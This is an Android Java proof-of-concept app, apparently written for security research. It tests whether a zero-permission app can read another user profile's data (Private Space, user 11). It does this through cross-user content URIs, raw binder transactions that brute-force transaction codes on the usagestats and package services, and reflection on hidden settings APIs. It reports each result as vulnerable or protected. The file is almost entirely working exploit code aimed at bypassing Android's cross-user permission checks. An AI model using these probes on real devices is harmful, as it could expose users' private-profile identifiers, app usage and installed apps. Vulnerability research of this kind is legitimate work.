package com.poc.rangingleak;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.UserHandle;
import android.provider.Settings;
import android.widget.ScrollView;
import android.widget.TextView;
import java.lang.reflect.Method;

/**
 * Cross-User Data Access PoC
 * Tests whether a zero-permission app can access Private Space (user 11) data
 */
public class CrossUserTest extends Activity {

    private TextView logView;
    private StringBuilder logBuffer = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextSize(11f);
        logView.setPadding(16, 16, 16, 16);
        scroll.addView(logView);
        setContentView(scroll);

        log("=== Cross-User Private Space Access PoC ===");
        log("Package: " + getPackageName());
        log("UID: " + android.os.Process.myUid());
        log("No permissions declared.\n");

        new Thread(this::runTests).start();
    }

    private void runTests() {
        // Test 1: Try to read user 11's settings via content URI
        testCrossUserSettings();

        // Test 2: Try to access user 11's usage stats via binder
        testCrossUserUsageStats();

        // Test 3: Try to query user 11's app list via PackageManager
        testCrossUserPackages();

        // Test 4: Try Settings.Secure.getStringForUser via reflection
        testSettingsReflection();
    }

    private void testCrossUserSettings() {
        log("--- Test 1: Cross-user Settings ContentProvider ---");
        log("Target: content://11@settings/secure/android_id");
        try {
            // Try the cross-user content URI syntax
            Uri uri = Uri.parse("content://11@settings/secure/android_id");
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(uri, null, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    String value = cursor.getString(cursor.getColumnIndex("value"));
                    log("Result: Got value = " + value);
                    log(">>> VULNERABLE — read user 11 android_id without permission!");
                } else {
                    log("Result: Empty cursor");
                }
                cursor.close();
            } else {
                log("Result: null cursor");
            }
        } catch (SecurityException e) {
            log("Result: SecurityException — " + e.getMessage());
            log(">>> PROTECTED (correctly requires INTERACT_ACROSS_USERS)");
        } catch (Exception e) {
            log("Result: " + e.getClass().getSimpleName() + " — " + e.getMessage());
        }
        log("");
    }

    private void testCrossUserUsageStats() {
        log("--- Test 2: Cross-user UsageStats Binder ---");
        log("Target: IUsageStatsManager.queryEventsForUser(userId=11)");
        try {
            IBinder binder = getServiceBinder("usagestats");
            if (binder == null) {
                log("[FAIL] Could not get usagestats binder");
                return;
            }

            // Try to find queryEventsForUser TX code
            // AIDL interface: android.app.usage.IUsageStatsManager
            String descriptor = "android.app.usage.IUsageStatsManager";

            // queryEventsForUser(int userId, long begin, long end, String callingPkg)
            // We need to figure out the TX code - let's try a range
            for (int tx = 5; tx <= 7; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                data.writeInterfaceToken(descriptor);
                data.writeInt(11);  // userId = 11 (Private Space)
                data.writeLong(0);  // begin time
                data.writeLong(System.currentTimeMillis());  // end time
                data.writeString(getPackageName());  // calling package

                try {
                    binder.transact(tx, data, reply, 0);
                    int exCode = reply.readInt();
                    if (exCode == 0) {
                        log("TX=" + tx + ": SUCCESS (no exception)");
                        // Try to read the result
                        int hasData = reply.readInt();
                        log("  hasData=" + hasData);
                        if (hasData != 0) {
                            log(">>> VULNERABLE — got usage data for user 11!");
                        }
                    } else {
                        String msg = reply.readString();
                        if (msg != null && (msg.contains("permission") || msg.contains("Permission"))) {
                            log("TX=" + tx + ": Permission denied");
                        } else {
                            log("TX=" + tx + ": Exception " + exCode + ": " + (msg != null ? msg.substring(0, Math.min(80, msg.length())) : "null"));
                        }
                    }
                } catch (Exception e) {
                    log("TX=" + tx + ": " + e.getClass().getSimpleName());
                }
                data.recycle();
                reply.recycle();
            }
        } catch (Exception e) {
            log("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testCrossUserPackages() {
        log("--- Test 3: Cross-user Package enumeration ---");
        log("Target: IPackageManager methods with userId=11");
        try {
            IBinder binder = getServiceBinder("package");
            if (binder == null) {
                log("[FAIL] Could not get package binder");
                return;
            }
            String descriptor = "android.content.pm.IPackageManager";

            // getInstalledPackages(flags, userId) - try to get user 11's packages
            // TX code varies by Android version, let's try a few
            // In Android 16, getInstalledPackages might be around TX=50-80
            // Actually let's use getPackageInfo which is usually TX=4-6

            // A simpler test: isPackageAvailable(packageName, userId)
            // This just checks if a package is installed for a given user
            // If we can enumerate packages in user 11, that's info disclosure

            // Let's try getApplicationInfo(String packageName, long flags, int userId)
            // or checkPackageHasPermission type methods
            
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(descriptor);
            data.writeString("com.google.android.dialer"); // package to check
            data.writeLong(0); // flags
            data.writeInt(11); // userId = 11

            // getApplicationInfo is typically one of the first methods
            boolean found = false;
            for (int tx : new int[]{13, 14, 15, 58, 59, 60, 61, 62}) {
                data = Parcel.obtain();
                reply = Parcel.obtain();
                data.writeInterfaceToken(descriptor);
                data.writeString("com.google.android.dialer");
                data.writeLong(0);
                data.writeInt(11);

                try {
                    binder.transact(tx, data, reply, 0);
                    int exCode = reply.readInt();
                    if (exCode == 0) {
                        int notNull = reply.readInt();
                        if (notNull != 0) {
                            log("TX=" + tx + ": Got non-null result for user 11 package query!");
                            log(">>> Potential cross-user package enumeration");
                            found = true;
                        }
                    }
                } catch (Exception e) {
                    // ignore
                }
                data.recycle();
                reply.recycle();
                if (found) break;
            }
            if (!found) {
                log("No successful package query for user 11 (tested several TX codes)");
            }

        } catch (Exception e) {
            log("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        log("");
    }

    private void testSettingsReflection() {
        log("--- Test 4: Settings.Secure.getStringForUser reflection ---");
        log("Target: Private Space android_id via Settings API");
        try {
            // Try to call Settings.Secure.getStringForUser(resolver, name, userId)
            // This is a hidden API but accessible via reflection
            Method m = Settings.Secure.class.getMethod("getStringForUser",
                    ContentResolver.class, String.class, int.class);
            String value = (String) m.invoke(null, getContentResolver(), "android_id", 11);
            if (value != null) {
                log("Result: android_id for user 11 = " + value);
                log(">>> VULNERABLE — read Private Space android_id!");
            } else {
                log("Result: null (no access or empty)");
            }
        } catch (SecurityException e) {
            log("Result: SecurityException — " + e.getMessage());
            log(">>> PROTECTED");
        } catch (NoSuchMethodException e) {
            log("Result: Method not found (hidden API blocked)");
            // Try alternative: direct content resolver
            try {
                Uri uri = Uri.parse("content://settings/secure");
                // Add userId to the call
                Bundle extras = new Bundle();
                extras.putInt("_user", 11);
                Bundle result = getContentResolver().call(uri, "GET_secure", "android_id", extras);
                if (result != null) {
                    String value = result.getString("value");
                    log("Via call(): android_id = " + value);
                    if (value != null) {
                        log(">>> VULNERABLE via ContentResolver.call!");
                    }
                }
            } catch (Exception e2) {
                log("Alternative also failed: " + e2.getMessage());
            }
        } catch (Exception e) {
            log("Result: " + e.getClass().getSimpleName() + " — " + e.getMessage());
        }
    }

    private IBinder getServiceBinder(String serviceName) {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            return (IBinder) getService.invoke(null, serviceName);
        } catch (Exception e) {
            log("[ERROR] ServiceManager reflection failed: " + e.getMessage());
            return null;
        }
    }

    private void log(String msg) {
        logBuffer.append(msg).append("\n");
        runOnUiThread(() -> logView.setText(logBuffer.toString()));
    }
}
